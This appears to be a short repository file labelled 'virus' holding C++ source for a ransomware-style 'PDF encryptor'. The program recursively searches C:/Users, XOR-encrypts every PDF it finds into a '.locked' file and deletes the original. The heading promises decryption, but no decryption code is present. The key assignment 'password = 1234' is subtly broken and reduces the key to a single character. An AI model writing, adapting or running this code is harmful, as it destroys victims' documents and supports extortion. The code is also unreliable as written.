# virus
#virus incryption &amp; decryption of all pdf files
............VIRUS ENCRYPTOR..........

#include <iostream>
#include <fstream>
#include <string>
#include <dirent.h>
#include <cstdio>
#include <sys/stat.h>

using namespace std;

int totalEncrypted = 0;

void processEncryption(const string& filePath, const string& password) {
    string outPath = filePath + ".locked";
    ifstream inFile(filePath.c_str(), ios::binary);
    ofstream outFile(outPath.c_str(), ios::binary);
    
    if (!inFile || !outFile) return;

    char buffer;
    int i = 0;
    while (inFile.get(buffer)) {
        outFile.put(buffer ^ password[i % password.length()]);
        i++;
    }
    inFile.close();
    outFile.close();
    remove(filePath.c_str());
    
    cout << "[SUCCESS] Locked: " << filePath << endl;
    totalEncrypted++;
}

void searchDirectory(string path, string password) {
    DIR *dir;
    struct dirent *ent;
    struct stat st;

    if ((dir = opendir(path.c_str())) == NULL) return;

    while ((ent = readdir(dir)) != NULL) {
        string name = ent->d_name;
        if (name == "." || name == "..") continue;

        string fullPath = path + "/" + name;
        stat(fullPath.c_str(), &st);

        if (S_ISDIR(st.st_mode)) {
            searchDirectory(fullPath, password); // Recurse into subfolder
        } else {
            if (name.length() > 4 && name.substr(name.length() - 4) == ".pdf") {
                processEncryption(fullPath, password);
            }
        }
    }
    closedir(dir);
}

int main() {
    // Note the use of forward slashes to avoid escape character errors
    string targetDir = "C:/Users";
    string password;

    cout << "--- DOCUMENTS PDF ENCRYPTOR ---" << endl;
    password = 1234;

    cout << "\nScanning Documents...\n" << endl;
    searchDirectory(targetDir, password);

    cout << "\n-----------------------------------" << endl;
    cout << "Finished. Total files encrypted: " << totalEncrypted << endl;
    system("pause");
    return 0;
}
